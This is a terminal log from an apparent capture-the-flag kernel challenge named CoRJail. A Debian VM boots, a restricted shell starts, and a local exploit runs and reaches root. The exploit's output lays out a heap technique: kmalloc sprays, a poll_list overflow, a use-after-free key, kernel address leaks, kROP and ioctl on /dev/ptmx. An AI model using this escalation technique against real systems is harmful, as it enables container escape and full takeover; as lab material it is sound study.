[+] starting exploit localy...
c[?7l[2J[0mSeaBIOS (version 1.15.0-1)


iPXE (https://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+3FF8B310+3FECB310 CA00
Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               


Booting from ROM..c[?7l[2J
Welcome to [1mDebian GNU/Linux 11 (bullseye)[0m!

[[0;32m  OK  [0m] Created slice [0;1;39msystem-getty.slice[0m.
[[0;32m  OK  [0m] Created slice [0;1;39msystem-modprobe.slice[0m.
[[0;32m  OK  [0m] Created slice [0;1;39msystem-serial\x2dgetty.slice[0m.
[[0;32m  OK  [0m] Started [0;1;39mDispatch Password …ts to Console Directory Watch[0m.
[[0;32m  OK  [0m] Started [0;1;39mForward Password R…uests to Wall Directory Watch[0m.
[[0;32m  OK  [0m] Reached target [0;1;39mLocal Encrypted Volumes[0m.
[[0;32m  OK  [0m] Reached target [0;1;39mPaths[0m.
[[0;32m  OK  [0m] Reached target [0;1;39mRemote File Systems[0m.
[[0;32m  OK  [0m] Reached target [0;1;39mSlices[0m.
[[0;32m  OK  [0m] Reached target [0;1;39mSwap[0m.
[[0;32m  OK  [0m] Listening on [0;1;39minitctl Compatibility Named Pipe[0m.
[[0;32m  OK  [0m] Listening on [0;1;39mJournal Audit Socket[0m.
[[0;32m  OK  [0m] Listening on [0;1;39mJournal Socket (/dev/log)[0m.
[[0;32m  OK  [0m] Listening on [0;1;39mJournal Socket[0m.
[[0;32m  OK  [0m] Listening on [0;1;39mudev Control Socket[0m.
[[0;32m  OK  [0m] Listening on [0;1;39mudev Kernel Socket[0m.
         Mounting [0;1;39mHuge Pages File System[0m...
         Mounting [0;1;39mPOSIX Message Queue File System[0m...
         Mounting [0;1;39mKernel Trace File System[0m...
         Starting [0;1;39mLoad Kernel Module configfs[0m...
         Starting [0;1;39mLoad Kernel Module fuse[0m...
         Starting [0;1;39mJournal Service[0m...
         Starting [0;1;39mLoad Kernel Modules[0m...
         Starting [0;1;39mRemount Root and Kernel File Systems[0m...
         Starting [0;1;39mColdplug All udev Devices[0m...
[[0;32m  OK  [0m] Finished [0;1;39mLoad Kernel Module configfs[0m.
[[0;32m  OK  [0m] Mounted [0;1;39mHuge Pages File System[0m.
[[0;32m  OK  [0m] Mounted [0;1;39mPOSIX Message Queue File System[0m.
[[0;32m  OK  [0m] Mounted [0;1;39mKernel Trace File System[0m.
[[0;32m  OK  [0m] Finished [0;1;39mLoad Kernel Module fuse[0m.
         Mounting [0;1;39mKernel Configuration File System[0m...
[[0;32m  OK  [0m] Finished [0;1;39mRemount Root and Kernel File Systems[0m.
[[0;32m  OK  [0m] Finished [0;1;39mLoad Kernel Modules[0m.
[[0;32m  OK  [0m] Mounted [0;1;39mKernel Configuration File System[0m.
         Starting [0;1;39mLoad/Save Random Seed[0m...
         Starting [0;1;39mApply Kernel Variables[0m...
         Starting [0;1;39mCreate System Users[0m...
[[0;32m  OK  [0m] Finished [0;1;39mApply Kernel Variables[0m.
[[0;32m  OK  [0m] Finished [0;1;39mLoad/Save Random Seed[0m.
[[0;32m  OK  [0m] Finished [0;1;39mCreate System Users[0m.
         Starting [0;1;39mCreate Static Device Nodes in /dev[0m...
[[0;32m  OK  [0m] Started [0;1;39mJournal Service[0m.
         Starting [0;1;39mFlush Journal to Persistent Storage[0m...
[[0;32m  OK  [0m] Finished [0;1;39mColdplug All udev Devices[0m.
         Starting [0;1;39mHelper to synchronize boot up for ifupdown[0m...
[[0;32m  OK  [0m] Finished [0;1;39mCreate Static Device Nodes in /dev[0m.
[[0;32m  OK  [0m] Finished [0;1;39mFlush Journal to Persistent Storage[0m.
[[0;32m  OK  [0m] Reached target [0;1;39mLocal File Systems (Pre)[0m.
[[0;32m  OK  [0m] Reached target [0;1;39mLocal File Systems[0m.
         Starting [0;1;39mLoad AppArmor profiles[0m...
         Starting [0;1;39mCreate Volatile Files and Directories[0m...
         Starting [0;1;39mRule-based Manage…for Device Events and Files[0m...
[[0;32m  OK  [0m] Finished [0;1;39mCreate Volatile Files and Directories[0m.
         Starting [0;1;39mUpdate UTMP about System Boot/Shutdown[0m...
[[0;32m  OK  [0m] Finished [0;1;39mUpdate UTMP about System Boot/Shutdown[0m.
[[0;32m  OK  [0m] Started [0;1;39mRule-based Manager for Device Events and Files[0m.
[[0;32m  OK  [0m] Finished [0;1;39mLoad AppArmor profiles[0m.
[[0;32m  OK  [0m] Reached target [0;1;39mSystem Initialization[0m.
[[0;32m  OK  [0m] Started [0;1;39mDiscard unused blocks once a week[0m.
[[0;32m  OK  [0m] Started [0;1;39mDaily Cleanup of Temporary Directories[0m.
[[0;32m  OK  [0m] Reached target [0;1;39mTimers[0m.
         Starting [0;1;39mDocker Socket for the API[0m.
[[0;32m  OK  [0m] Found device [0;1;39m/dev/ttyS0[0m.
[[0;32m  OK  [0m] Listening on [0;1;39mDocker Socket for the API[0m.
[[0;32m  OK  [0m] Reached target [0;1;39mSockets[0m.
[[0;32m  OK  [0m] Reached target [0;1;39mBasic System[0m.
         Starting [0;1;39mgetty on tty2-tty…nd logind are not available[0m...
         Starting [0;1;39mInitialize challenge[0m...
[[0;32m  OK  [0m] Finished [0;1;39mgetty on tty2-tty… and logind are not available[0m.
[[0;32m  OK  [0m] Finished [0;1;39mInitialize challenge[0m.
[[0;32m  OK  [0m] Finished [0;1;39mHelper to synchronize boot up for ifupdown[0m.
         Starting [0;1;39mRaise network interfaces[0m...
[[0;32m  OK  [0m] Finished [0;1;39mRaise network interfaces[0m.
[[0;32m  OK  [0m] Reached target [0;1;39mNetwork[0m.
[[0;32m  OK  [0m] Reached target [0;1;39mNetwork is Online[0m.
         Starting [0;1;39mcontainerd container runtime[0m...
         Starting [0;1;39mPermit User Sessions[0m...
[[0;32m  OK  [0m] Finished [0;1;39mPermit User Sessions[0m.
[[0;32m  OK  [0m] Started [0;1;39mGetty on tty1[0m.
[[0;32m  OK  [0m] Started [0;1;39mGetty on tty2[0m.
[[0;32m  OK  [0m] Started [0;1;39mGetty on tty3[0m.
[[0;32m  OK  [0m] Started [0;1;39mGetty on tty4[0m.
[[0;32m  OK  [0m] Started [0;1;39mGetty on tty5[0m.
[[0;32m  OK  [0m] Started [0;1;39mGetty on tty6[0m.
[[0;32m  OK  [0m] Started [0;1;39mSerial Getty on ttyS0[0m.
[[0;32m  OK  [0m] Reached target [0;1;39mLogin Prompts[0m.
[[0;32m  OK  [0m] Started [0;1;39mcontainerd container runtime[0m.
         Starting [0;1;39mDocker Application Container Engine[0m...
[[0;32m  OK  [0m] Started [0;1;39mDocker Application Container Engine[0m.
[[0;32m  OK  [0m] Reached target [0;1;39mMulti-User System[0m.
[[0;32m  OK  [0m] Reached target [0;1;39mGraphical Interface[0m.
         Starting [0;1;39mUpdate UTMP about System Runlevel Changes[0m...
[[0;32m  OK  [0m] Finished [0;1;39mUpdate UTMP about System Runlevel Changes[0m.

[[5m[1;33m![0m] Spawning a shell in a CoRJail...

    [0m[38;2;83;82;83m■[0m[38;2;56;64;61m■[0m[38;2;31;90;55m■[0m[38;2;20;31;27m▪[0m[38;2;20;31;27m▪[0m[38;2;20;31;27m▪[0m[38;2;20;31;27m▪[0m[38;2;20;31;27m▪[0m[38;2;20;31;27m▪[0m[38;2;20;31;27m▪[0m[38;2;20;31;27m▪[0m[38;2;24;52;37m■[0m[38;2;27;71;46m■[0m[38;2;95;101;101m▒[0m[38;2;123;127;127m▒[0m[38;2;125;129;130m▒[0m[38;2;102;105;106m▒[0m[38;2;22;44;33m■[0m[38;2;20;38;30m■[0m[38;2;20;31;27m▪[0m[38;2;20;56;35m■[0m[38;2;18;89;46m■[0m[38;2;20;30;27m▪[0m[38;2;20;31;27m▪[0m[38;2;21;36;29m▪[0m[38;2;25;60;41m■[0m[38;2;31;95;56m■[0m[38;2;21;34;28m▪[0m[38;2;26;36;33m■[0m[38;2;82;84;84m■[0m                          
    [0m[38;2;85;86;86m■[0m[38;2;105;105;105m▒[0m[38;2;50;78;61m■[0m[38;2;28;37;33m■[0m[38;2;18;54;34m■[0m[38;2;17;37;28m▪[0m[38;2;17;32;26m▪[0m[38;2;17;35;27m▪[0m[38;2;16;56;34m■[0m[38;2;17;32;26m▪[0m[38;2;22;65;41m■[0m[38;2;28;104;59m■[0m[38;2;59;137;70m▒[0m[38;2;138;129;85m▒[0m[38;2;206;158;68m▓[0m[38;2;206;161;73m▓[0m[38;2;168;149;86m▒[0m[38;2;58;99;48m■[0m[38;2;15;71;39m■[0m[38;2;17;37;27m▪[0m[38;2;15;98;47m■[0m[38;2;15;88;44m■[0m[38;2;17;31;26m▪[0m[38;2;17;32;26m▪[0m[38;2;30;110;62m■[0m[38;2;29;105;59m■[0m[38;2;26;54;39m■[0m[38;2;31;38;35m■[0m[38;2;73;75;74m■[0m[38;2;112;112;112m▒[0m                  [38;2;25;81;48m▪[0m[38;2;24;52;37m■[0m[38;2;27;52;67m■[0m[38;2;31;90;55m■[0m[38;2;20;31;27m▪[0m[38;2;70;31;27m▪[0m[38;2;31;90;55m■[0m[38;2;20;31;27m▪[0m[38;2;24;52;37m■[0m[38;2;20;31;27m▪[0m[38;2;34;90;55m■[0m[38;2;24;52;37m■[0m[38;2;70;31;27m▪[0m[38;2;25;81;48m▪[0m[38;2;25;81;48m▪[0m[38;2;34;90;55m■[0m[38;2;24;52;37m■[0m[38;2;31;90;55m■[0m[38;2;70;31;27m▪[0m[38;2;24;52;37m■[0m[38;2;27;52;67m■[0m[38;2;24;52;37m■[0m[38;2;70;31;27m▪[0m[38;2;27;52;67m■[0m[38;2;25;81;48m▪[0m[38;2;31;90;55m■[0m[38;2;24;52;37m■[0m
    [0m[38;2;15;26;21m▪[0m[38;2;22;31;28m▪[0m[38;2;30;32;31m▪[0m[38;2;36;36;36m■[0m[38;2;38;47;41m■[0m[38;2;31;59;42m■[0m[38;2;26;36;32m■[0m[38;2;19;36;28m▪[0m[38;2;15;79;41m■[0m[38;2;16;51;32m■[0m[38;2;17;32;26m▪[0m[38;2;23;69;43m■[0m[38;2;38;91;58m■[0m[38;2;109;106;83m▒[0m[38;2;146;138;86m▒[0m[38;2;148;140;88m▒[0m[38;2;117;111;86m▒[0m[38;2;41;68;49m■[0m[38;2;17;40;29m▪[0m[38;2;19;56;36m■[0m[38;2;17;71;39m■[0m[38;2;15;78;41m■[0m[38;2;16;61;35m■[0m[38;2;21;54;36m■[0m[38;2;29;40;35m■[0m[38;2;40;68;51m■[0m[38;2;38;38;38m■[0m[38;2;34;34;34m■[0m[38;2;26;31;29m▪[0m[38;2;20;32;27m▪[0m             [38;2;27;52;67m■[0m[38;2;25;81;48m▪[0m[38;2;70;31;27m▪[0m[38;2;27;52;67m■[0m[38;2;24;52;37m■[0m[38;2;34;90;55m■[0m[38;2;20;31;27m▪[0m[38;2;27;52;67m■[0m[38;2;24;52;37m■[0m[38;2;31;90;55m■[0m[38;2;25;81;48m▪[0m[38;2;31;90;55m■[0m[38;2;34;90;55m■[0m[38;2;24;52;37m■[0m[38;2;34;90;55m■[0m[38;2;20;31;27m▪[0m[38;2;31;90;55m■[0m[38;2;70;31;27m▪[0m[38;2;31;90;55m■[0m[38;2;31;90;55m■[0m[38;2;27;52;67m■[0m[38;2;27;52;67m■[0m[38;2;34;90;55m■[0m[38;2;70;31;27m▪[0m[38;2;31;90;55m■[0m[38;2;24;52;37m■[0m[38;2;70;31;27m▪[0m[38;2;70;31;27m▪[0m[38;2;20;31;27m▪[0m[38;2;70;31;27m▪[0m[38;2;34;90;55m■[0m[38;2;25;81;48m▪[0m[38;2;20;31;27m▪[0m[38;2;27;52;67m■[0m[38;2;70;31;27m▪[0m[38;2;20;31;27m▪[0m
    [0m[38;2;14;27;22m▪[0m[38;2;16;63;36m■[0m[38;2;17;46;31m■[0m[38;2;21;35;29m▪[0m[38;2;25;42;32m■[0m[38;2;30;39;34m■[0m[38;2;34;34;34m■[0m[38;2;36;36;36m■[0m[38;2;33;53;40m■[0m[38;2;90;94;92m■[0m[38;2;139;141;140m▒[0m[38;2;46;48;47m■[0m[38;2;26;36;30m■[0m[38;2;36;36;36m■[0m[38;2;41;40;40m■[0m[38;2;51;50;50m■[0m[38;2;52;52;52m■[0m[38;2;53;54;53m■[0m[38;2;58;59;58m■[0m[38;2;123;139;129m▒[0m[38;2;107;121;113m▒[0m[38;2;34;45;39m■[0m[38;2;34;45;38m■[0m[38;2;35;35;35m■[0m[38;2;33;36;34m■[0m[38;2;28;34;31m■[0m[38;2;24;36;30m▪[0m[38;2;19;38;29m▪[0m[38;2;17;32;26m▪[0m[38;2;17;32;26m▪[0m           [38;2;31;90;55m■[0m[38;2;24;52;37m■[0m[38;2;24;52;37m■[0m[38;2;31;90;55m■[0m[38;2;25;81;48m▪[0m[1m/  __ \[0m[38;2;25;81;48m▪[0m[38;2;24;52;37m■[0m[38;2;34;90;55m■[0m[38;2;31;90;55m■[0m[38;2;70;31;27m▪[0m[1m| ___ \/ _ \/  ___|[0m[38;2;34;90;55m■[0m[38;2;25;81;48m▪[0m[38;2;34;90;55m■[0m[38;2;34;90;55m■[0m[38;2;31;90;55m■[0m
    [0m[38;2;14;28;22m▪[0m[38;2;15;76;40m■[0m[38;2;15;96;47m■[0m[38;2;16;72;39m■[0m[38;2;16;56;34m■[0m[38;2;16;61;35m■[0m[38;2;20;38;29m▪[0m[38;2;23;43;32m■[0m[38;2;28;30;29m▪[0m[38;2;53;52;52m■[0m[38;2;167;164;164m▓[0m[38;2;182;182;182m▓[0m[38;2;159;159;159m▒[0m[38;2;138;119;119m▒[0m[38;2;122;61;61m■[0m[38;2;127;60;60m■[0m[38;2;137;91;91m▒[0m[38;2;159;153;153m▒[0m[38;2;178;177;177m▓[0m[38;2;186;186;186m▓[0m[38;2;133;133;133m▒[0m[38;2;30;30;30m▪[0m[38;2;26;31;29m▪[0m[38;2;22;31;28m▪[0m[38;2;17;68;38m■[0m[38;2;16;70;38m■[0m[38;2;15;72;39m■[0m[38;2;17;43;30m■[0m[38;2;17;32;26m▪[0m[38;2;17;32;26m▪[0m        [38;2;27;52;67m■[0m[38;2;31;90;55m■[0m[38;2;20;31;27m▪[0m[38;2;27;52;67m■[0m[38;2;34;90;55m■[0m[38;2;24;52;37m■[0m[38;2;31;90;55m■[0m[38;2;25;81;48m▪[0m[1m| /[0m[38;2;31;90;55m■[0m[38;2;27;52;67m■[0m[1m\/[0m[38;2;25;81;48m▪[0m[38;2;25;81;48m▪[0m[38;2;31;90;55m■[0m[38;2;25;81;48m▪[0m[38;2;34;90;55m■[0m[1m| |[0m[38;2;20;31;27m▪[0m[1m/ /[0m[1m |[0m[38;2;24;52;37m■[0m[1m| \ `--.[0m[38;2;70;31;27m▪[0m[38;2;24;52;37m■[0m[38;2;20;31;27m▪[0m[38;2;25;81;48m▪[0m[38;2;34;90;55m■[0m[38;2;24;52;37m■[0m[38;2;70;31;27m▪[0m[38;2;24;52;37m■[0m[38;2;31;90;55m■[0m
    [0m[38;2;14;26;21m▪[0m[38;2;17;34;27m▪[0m[38;2;16;59;35m■[0m[38;2;16;48;31m■[0m[38;2;16;46;30m■[0m[38;2;16;55;33m■[0m[38;2;16;61;35m■[0m[38;2;16;54;33m■[0m[38;2;17;36;27m▪[0m[38;2;20;32;27m▪[0m[38;2;90;91;90m■[0m[38;2;173;170;170m▓[0m[38;2;192;115;115m▒[0m[38;2;198;57;57m▒[0m[38;2;196;77;77m▒[0m[38;2;197;68;68m▒[0m[38;2;195;85;85m▒[0m[38;2;196;72;72m▒[0m[38;2;188;167;167m▓[0m[38;2;186;186;186m▓[0m[38;2;64;74;70m■[0m[38;2;20;41;31m■[0m[38;2;20;49;34m■[0m[38;2;19;45;32m■[0m[38;2;17;38;28m▪[0m[38;2;15;94;46m■[0m[38;2;15;89;45m■[0m[38;2;16;50;32m■[0m[38;2;17;32;26m▪[0m[38;2;17;32;26m▪[0m          [38;2;31;90;55m■[0m[38;2;34;90;55m■[0m[38;2;25;81;48m▪[0m[38;2;70;31;27m▪[0m[38;2;20;31;27m▪[0m[38;2;34;90;55m■[0m[1m| |[0m[38;2;31;90;55m■[0m[38;2;34;90;55m■[0m[38;2;31;90;55m■[0m[38;2;70;31;27m▪[0m[1m/ _ \|    /| |[0m[38;2;70;31;27m▪[0m[1m| |`--. \[0m[38;2;24;52;37m■[0m[38;2;24;52;37m■[0m[38;2;34;90;55m■[0m[38;2;31;90;55m■[0m[38;2;20;31;27m▪[0m[38;2;34;90;55m■[0m
    [0m[38;2;19;53;34m■[0m[38;2;30;114;63m■[0m[38;2;27;96;55m■[0m[38;2;16;71;39m■[0m[38;2;17;32;26m▪[0m[38;2;16;68;38m■[0m[38;2;17;32;26m▪[0m[38;2;17;32;26m▪[0m[38;2;17;32;26m▪[0m[38;2;19;41;30m■[0m[38;2;48;96;67m■[0m[38;2;113;112;112m▒[0m[38;2;182;107;107m▒[0m[38;2;198;57;57m▒[0m[38;2;197;65;65m▒[0m[38;2;191;130;130m▒[0m[38;2;197;64;64m▒[0m[38;2;197;67;67m▒[0m[38;2;164;130;130m▒[0m[38;2;186;86;85m▒[0m[38;2;75;23;19m■[0m[38;2;50;97;54m■[0m[38;2;36;153;82m▒[0m[38;2;29;107;60m■[0m[38;2;17;34;27m▪[0m[38;2;16;67;37m■[0m[38;2;15;82;42m■[0m[38;2;16;50;32m■[0m[38;2;17;32;26m▪[0m[38;2;17;32;26m▪[0m        [38;2;27;52;67m■[0m[38;2;27;52;67m■[0m[38;2;70;31;27m▪[0m[38;2;27;52;67m■[0m[38;2;25;81;48m▪[0m[38;2;20;31;27m▪[0m[38;2;20;31;27m▪[0m[38;2;24;52;37m■[0m[1m| \[0m[38;2;25;81;48m▪[0m[38;2;24;52;37m■[0m[1m/\ ([0m[38;2;25;81;48m▪[0m[1m) | |\ \\ \[0m[38;2;25;81;48m▪[0m[1m/ /\[0m[38;2;27;52;67m■[0m[38;2;34;90;55m■[0m[1m/ /[0m[38;2;20;31;27m▪[0m[38;2;24;52;37m■[0m[38;2;20;31;27m▪[0m[38;2;27;52;67m■[0m[38;2;34;90;55m■[0m[38;2;24;52;37m■[0m
    [0m[38;2;17;42;29m■[0m[38;2;35;143;77m▒[0m[38;2;29;104;59m■[0m[38;2;17;32;26m▪[0m[38;2;17;32;26m▪[0m[38;2;15;82;42m■[0m[38;2;16;55;33m■[0m[38;2;17;34;27m▪[0m[38;2;17;31;26m▪[0m[38;2;34;135;73m▒[0m[38;2;24;72;45m■[0m[38;2;48;71;57m■[0m[38;2;99;98;98m▒[0m[38;2;92;78;78m■[0m[38;2;99;45;45m■[0m[38;2;112;50;50m■[0m[38;2;120;81;81m■[0m[38;2;129;126;126m▒[0m[38;2;125;73;73m■[0m[38;2;208;5;5m■[0m[38;2;184;5;4m■[0m[38;2;179;8;6m■[0m[38;2;139;18;12m■[0m[38;2;83;31;21m■[0m[38;2;16;51;32m■[0m[38;2;17;32;26m▪[0m[38;2;17;32;26m▪[0m[38;2;17;32;26m▪[0m[38;2;17;32;26m▪[0m[38;2;17;32;26m▪[0m           [38;2;70;31;27m▪[0m[38;2;20;31;27m▪[0m[38;2;70;31;27m▪[0m[38;2;34;90;55m■[0m[38;2;24;52;37m■[0m[38;2;24;52;37m■[0m[1m\____/\___/\_| \_|\___/\____/[0m[38;2;24;52;37m■[0m[38;2;31;90;55m■[0m[38;2;70;31;27m▪[0m[38;2;25;81;48m▪[0m[38;2;24;52;37m■[0m[38;2;27;52;67m■[0m[38;2;25;81;48m▪[0m
    [0m[38;2;14;26;21m▪[0m[38;2;19;45;32m■[0m[38;2;18;41;30m■[0m[38;2;16;50;32m■[0m[38;2;16;48;31m■[0m[38;2;17;36;27m▪[0m[38;2;17;43;30m■[0m[38;2;16;52;33m■[0m[38;2;17;32;26m▪[0m[38;2;20;53;36m■[0m[38;2;43;101;66m■[0m[38;2;123;130;125m▒[0m[38;2;161;160;160m▓[0m[38;2;178;177;177m▓[0m[38;2;151;151;151m▒[0m[38;2;121;121;121m▒[0m[38;2;78;78;78m■[0m[38;2;134;134;134m▒[0m[38;2;101;98;98m▒[0m[38;2;94;94;91m■[0m[38;2;16;37;27m▪[0m[38;2;16;32;26m▪[0m[38;2;17;32;26m▪[0m[38;2;17;37;28m▪[0m[38;2;17;34;27m▪[0m[38;2;16;55;33m■[0m[38;2;16;62;36m■[0m[38;2;15;73;39m■[0m[38;2;17;42;29m■[0m[38;2;17;32;26m▪[0m               [38;2;27;52;67m■[0m[38;2;25;81;48m▪[0m[38;2;25;81;48m▪[0m[38;2;31;90;55m■[0m[38;2;70;31;27m▪[0m[38;2;24;52;37m■[0m[38;2;24;52;37m■[0m[38;2;20;31;27m▪[0m[38;2;34;90;55m■[0m[38;2;24;52;37m■[0m[38;2;27;52;67m■[0m[38;2;34;90;55m■[0m[38;2;20;31;27m▪[0m[38;2;20;31;27m▪[0m[38;2;31;90;55m■[0m[38;2;70;31;27m▪[0m[38;2;70;31;27m▪[0m[38;2;20;31;27m▪[0m[38;2;20;31;27m▪[0m[38;2;34;90;55m■[0m[38;2;70;31;27m▪[0m[38;2;25;81;48m▪[0m[38;2;31;90;55m■[0m[38;2;34;90;55m■[0m[38;2;70;31;27m▪[0m[38;2;70;31;27m▪[0m[38;2;70;31;27m▪[0m[38;2;31;90;55m■[0m[38;2;70;31;27m▪[0m[38;2;24;52;37m■[0m[38;2;25;81;48m▪[0m[38;2;25;81;48m▪[0m[38;2;34;90;55m■[0m
    [0m[38;2;14;26;21m▪[0m[38;2;17;32;26m▪[0m[38;2;16;47;31m■[0m[38;2;15;81;42m■[0m[38;2;14;107;50m■[0m[38;2;16;69;38m■[0m[38;2;17;41;29m■[0m[38;2;16;50;32m■[0m[38;2;16;45;30m■[0m[38;2;17;40;29m▪[0m[38;2;79;114;93m▒[0m[38;2;134;132;132m▒[0m[38;2;170;169;169m▓[0m[38;2;186;186;186m▓[0m[38;2;186;186;186m▓[0m[38;2;185;185;185m▓[0m[38;2;130;130;130m▒[0m[38;2;185;185;185m▓[0m[38;2;130;130;130m▒[0m[38;2;176;177;177m▓[0m[38;2;39;116;69m■[0m[38;2;16;64;36m■[0m[38;2;17;37;28m▪[0m[38;2;17;32;26m▪[0m[38;2;17;32;26m▪[0m[38;2;17;32;26m▪[0m[38;2;17;33;26m▪[0m[38;2;16;68;38m■[0m[38;2;17;32;26m▪[0m[38;2;17;32;26m▪[0m                  [38;2;31;90;55m■[0m[38;2;20;31;27m▪[0m[38;2;20;31;27m▪[0m[38;2;31;90;55m■[0m[38;2;27;52;67m■[0m[38;2;25;81;48m▪[0m[38;2;24;52;37m■[0m[38;2;27;52;67m■[0m[38;2;34;90;55m■[0m[38;2;20;31;27m▪[0m[38;2;27;52;67m■[0m[38;2;31;90;55m■[0m[38;2;70;31;27m▪[0m[38;2;27;52;67m■[0m[38;2;20;31;27m▪[0m[38;2;31;90;55m■[0m[38;2;27;52;67m■[0m[38;2;20;31;27m▪[0m[38;2;70;31;27m▪[0m[38;2;20;31;27m▪[0m[38;2;34;90;55m■[0m[38;2;25;81;48m▪[0m[38;2;27;52;67m■[0m[38;2;27;52;67m■[0m[38;2;25;81;48m▪[0m[38;2;34;90;55m■[0m
    [0m[38;2;14;26;21m▪[0m[38;2;17;32;26m▪[0m[38;2;16;47;31m■[0m[38;2;16;65;37m■[0m[38;2;16;69;38m■[0m[38;2;17;34;27m▪[0m[38;2;17;33;26m▪[0m[38;2;17;37;28m▪[0m[38;2;17;42;29m■[0m[38;2;32;63;46m■[0m[38;2;123;124;124m▒[0m[38;2;143;140;140m▒[0m[38;2;177;176;176m▓[0m[38;2;186;186;186m▓[0m[38;2;186;186;186m▓[0m[38;2;173;173;173m▓[0m[38;2;186;186;186m▓[0m[38;2;166;166;166m▓[0m[38;2;151;151;151m▒[0m[38;2;186;186;186m▓[0m[38;2;125;137;130m▒[0m[38;2;17;44;30m■[0m[38;2;17;32;26m▪[0m[38;2;17;32;26m▪[0m[38;2;16;61;35m■[0m[38;2;15;91;45m■[0m[38;2;15;78;41m■[0m[38;2;17;34;27m▪[0m[38;2;17;32;26m▪[0m[38;2;17;32;26m▪[0m                          
    [0m[38;2;14;26;21m▪[0m[38;2;18;36;28m▪[0m[38;2;25;81;49m■[0m[38;2;27;93;54m■[0m[38;2;17;32;26m▪[0m[38;2;17;32;26m▪[0m[38;2;16;49;32m■[0m[38;2;16;56;34m■[0m[38;2;17;32;26m▪[0m[38;2;87;92;90m■[0m[38;2;129;128;128m▒[0m[38;2;149;147;147m▒[0m[38;2;182;181;181m▓[0m[38;2;186;186;186m▓[0m[38;2;144;144;144m▒[0m[38;2;73;73;73m■[0m[38;2;180;180;180m▓[0m[38;2;185;185;185m▓[0m[38;2;185;185;185m▓[0m[38;2;186;186;186m▓[0m[38;2;184;184;184m▓[0m[38;2;49;67;58m■[0m[38;2;17;34;27m▪[0m[38;2;17;32;26m▪[0m[38;2;17;39;28m▪[0m[38;2;16;68;38m■[0m[38;2;16;66;37m■[0m[38;2;17;37;28m▪[0m[38;2;17;32;26m▪[0m[38;2;17;32;26m▪[0m                 ⚠️  Restricted Mode Enabled ⚠️             
    [0m[38;2;14;26;21m▪[0m[38;2;17;34;27m▪[0m[38;2;34;138;74m▒[0m[38;2;25;81;48m■[0m[38;2;17;34;27m▪[0m[38;2;17;32;26m▪[0m[38;2;16;58;35m■[0m[38;2;15;77;41m■[0m[38;2;38;89;59m■[0m[38;2;123;123;123m▒[0m[38;2;136;134;134m▒[0m[38;2;154;152;152m▒[0m[38;2;185;185;185m▓[0m[38;2;175;175;175m▓[0m[38;2;56;56;56m■[0m[38;2;35;35;35m■[0m[38;2;108;108;108m▒[0m[38;2;186;186;186m▓[0m[38;2;186;186;186m▓[0m[38;2;186;186;186m▓[0m[38;2;186;186;186m▓[0m[38;2;138;155;145m▒[0m[38;2;16;46;30m■[0m[38;2;16;50;32m■[0m[38;2;17;35;27m▪[0m[38;2;17;32;26m▪[0m[38;2;28;103;58m■[0m[38;2;21;55;36m■[0m[38;2;17;32;26m▪[0m[38;2;17;32;26m▪[0m
    [0m[38;2;14;26;21m▪[0m[38;2;17;34;27m▪[0m[38;2;22;63;40m■[0m[38;2;25;80;48m■[0m[38;2;18;41;30m■[0m[38;2;17;32;26m▪[0m[38;2;17;37;27m▪[0m[38;2;17;49;32m■[0m[38;2;95;104;99m▒[0m[38;2;125;125;125m▒[0m[38;2;142;139;139m▒[0m[38;2;161;159;159m▓[0m[38;2;187;186;186m▓[0m[38;2;101;101;101m▒[0m[38;2;35;35;35m■[0m[38;2;35;35;35m■[0m[38;2;40;40;40m■[0m[38;2;160;160;160m▓[0m[38;2;186;186;186m▓[0m[38;2;186;186;186m▓[0m[38;2;186;186;186m▓[0m[38;2;185;186;185m▓[0m[38;2;59;93;74m■[0m[38;2;16;49;32m■[0m[38;2;17;34;27m▪[0m[38;2;17;32;26m▪[0m[38;2;17;33;26m▪[0m[38;2;23;71;44m■[0m[38;2;25;80;48m■[0m[38;2;21;56;37m■[0m              Your access is limited to a CoRJail  
    [0m[38;2;23;30;23m▪[0m[38;2;24;33;26m▪[0m[38;2;24;33;26m▪[0m[38;2;24;33;26m▪[0m[38;2;24;33;26m▪[0m[38;2;24;33;26m▪[0m[38;2;24;33;26m▪[0m[38;2;25;34;27m▪[0m[38;2;88;88;84m■[0m[38;2;90;90;86m■[0m[38;2;100;98;94m▒[0m[38;2;116;115;111m▒[0m[38;2;126;125;121m▒[0m[38;2;39;39;35m■[0m[38;2;35;35;31m■[0m[38;2;35;35;31m■[0m[38;2;35;35;31m■[0m[38;2;76;76;72m■[0m[38;2;126;126;122m▒[0m[38;2;126;126;122m▒[0m[38;2;126;126;122m▒[0m[38;2;126;126;122m▒[0m[38;2;84;88;83m■[0m[38;2;24;33;26m▪[0m[38;2;24;33;26m▪[0m[38;2;24;33;26m▪[0m[38;2;24;33;26m▪[0m[38;2;24;33;26m▪[0m[38;2;24;33;25m▪[0m[38;2;26;43;30m■[0m

[?2004h[01;38;2;28;100;57muser@CoRJail[00m:[01;34m/[00m$ id
[?2004luid=1000(user) gid=1000(user) groups=1000(user)
[?2004h[01;38;2;28;100;57muser@CoRJail[00m:[01;34m/[00m$ ls /root
[?2004lls: cannot open directory '/root': Permission denied
[?2004h[01;38;2;28;100;57muser@CoRJail[00m:[01;34m/[00m$ ./home/user/host/exploit 
[?2004l[.] Starting exploit.
[+] preparing stack for later kROP...
[+] pre-spraying kmalloc-32...
[+] Spraying keys...
[+] Spraying poll_list (fd=2004)...
[+] NULL-byte overflow ing...
[+] Freed all 'poll_list'
[!] leaked single_show: 0xffffffff813275c0
[!] leaked kbase: 0xffffffff81000000
[+] read 0x4330 bytes from UAFed key
[!] 	+0: 0xffff88801950f000 (tty)
[!] 	+1: 0xffff8880194f7a00 (*file)
[!] 	+2: 0xffff88801950f268 (list_head.next)
[!] 	+3: 0xffff88801950f268 (list_head.prev)
[!] leaked kmalloc-1024: 0xffff88801950f000
[+] Freeed seq_operations
[+] spraying `poll_list` in kmalloc-32...
[+] Freeing UAFed key...
[+] spraying keys in kmalloc-32
[+] waiting corrupted `poll_list` is freed...
[+] waiting all keys are freed by GC...
[+] spraying keys in kmalloc-1024
[+] size: 0x290
[+] ioctl-ing to /dev/ptmx
[01;31mroot@CoROS[00m:[01;34m/[00m# id
uid=0(root) gid=0(root) groups=0(root)
[01;31mroot@CoROS[00m:[01;34m/[00m#                                                                  [01;31mroot@CoROS[00m:[01;34m/[00m# c ls /root
687373653c4ccdbb4e94fe8769086774d67d95c1e3c5abaa489272f7f0237f4e2b95e5cae5d1c6a97a5ae66ad6d0c863d75a838519a6b08dbfe4285b6dbbfdab
